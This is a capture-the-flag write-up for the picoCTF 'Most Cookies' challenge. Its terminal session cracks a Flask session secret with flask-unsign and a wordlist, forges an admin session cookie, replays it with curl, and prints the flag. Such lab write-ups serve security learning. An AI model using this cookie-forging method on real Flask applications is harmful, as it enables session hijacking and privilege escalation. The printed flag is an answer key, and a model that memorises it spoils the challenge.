## Introducción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/60f76192f6e1fea6f4e6e8c5fc9a6a27/server.py) [http://mercury.picoctf.net:44693/](http://mercury.picoctf.net:44693/)

How secure is a flask cookie?
## Descripción
px= instlar y correr ap ppython en ambientes diferentes

## Comandos
sudo apt install pipx
pipx ensurepath
source ~/.zshrc
 pipx install flask-unsing
```
┌──(kali㉿kali)-[~/Most_Cookies]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z0Q2Cw.zlgb01c4nb74noNYeUGjwdu5xmM" --wordlist galletas.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'butter'
                                                                               
┌──(kali㉿kali)-[~/Most_Cookies]
└─$ flask-unsign --sing --cookie "{'very_auth': 'admin'}" --secret 'butter'
usage: flask-unsign [-h] [-d] [-u] [-s] [-l] [-c [COOKIE]] [--secret SECRET]
                    [--salt SALT] [--wordlist WORDLIST] [--threads THREADS]
                    [--no-literal-eval] [--server SERVER] [--insecure]
                    [-o OUTPUT] [-p PROXY] [--cookie-name COOKIE_NAME]
                    [-U USER_AGENT] [-q] [-C CHUNK_SIZE] [-v]
flask-unsign: error: unrecognized arguments: --sing
                                                                               
┌──(kali㉿kali)-[~/Most_Cookies]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'butter'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z0Q7AA.ebb8TRzbLJwE4MUiBT7owyaqoPM
                                                                               
┌──(kali㉿kali)-[~/Most_Cookies]
└─$ curl http://mercury.picoctf.net:44693/display -H "Cookie: sessionyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z0Q7AA.ebb8TRzbLJwE4MUiBT7owyaqoPM" 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.                                                                               
┌──(kali㉿kali)-[~/Most_Cookies]
└─$ curl http://mercury.picoctf.net:44693/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z0Q2Cw.zlgb01c4nb74noNYeUGjwdu5xmM"
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Most Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Reset</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Most Cookies</h3>
        </div>
        
        <!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->
        
        
        <div class="alert alert-success alert-dismissible" role="alert" id="myAlert">
          <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
          <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
            </div>
      
      
      
        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>I love snickerdoodle cookies!</b></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
    <script>
    $(document).ready(function(){
        $(".close").click(function(){
            $("myAlert").alert("close");
        });
    });
    </script>
</body>

</html>                                                                               
┌──(kali㉿kali)-[~/Most_Cookies]
└─$ 
                                                                               
┌──(kali㉿kali)-[~/Most_Cookies]
└─$ flask-unsign --decode --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z0Q9dA.1BaGW-wv90tgaPtMorG_1zVWbFk"
{'very_auth': 'snickerdoodle'}
                                                                               
┌──(kali㉿kali)-[~/Most_Cookies]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z0Q9dA.1BaGW-wv90tgaPtMorG_1zVWbFk" --wordlist galletas.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'butter'
                                                                               
┌──(kali㉿kali)-[~/Most_Cookies]
└─$ flask-unsign --sing --cookie "{'very_auth': 'admin'}" --secret 'butter'
usage: flask-unsign [-h] [-d] [-u] [-s] [-l] [-c [COOKIE]] [--secret SECRET]
                    [--salt SALT] [--wordlist WORDLIST] [--threads THREADS]
                    [--no-literal-eval] [--server SERVER] [--insecure]
                    [-o OUTPUT] [-p PROXY] [--cookie-name COOKIE_NAME]
                    [-U USER_AGENT] [-q] [-C CHUNK_SIZE] [-v]
flask-unsign: error: unrecognized arguments: --sing
                                                                               
┌──(kali㉿kali)-[~/Most_Cookies]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'butter'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z0Q-FQ.T5k4w9k-W_CjxclsdEFJLNh_foM
                                                                               
┌──(kali㉿kali)-[~/Most_Cookies]
└─$ curl http://mercury.picoctf.net:44693/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z0Q-FQ.T5k4w9k-W_CjxclsdEFJLNh_foM" 
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Most Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Reset</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Most Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>                                                                               
┌──(kali㉿kali)-[~/Most_Cookies]
└─$ curl http://mercury.picoctf.net:44693/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z0Q-FQ.T5k4w9k-W_CjxclsdEFJLNh_foM"
```

## Solución 
picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}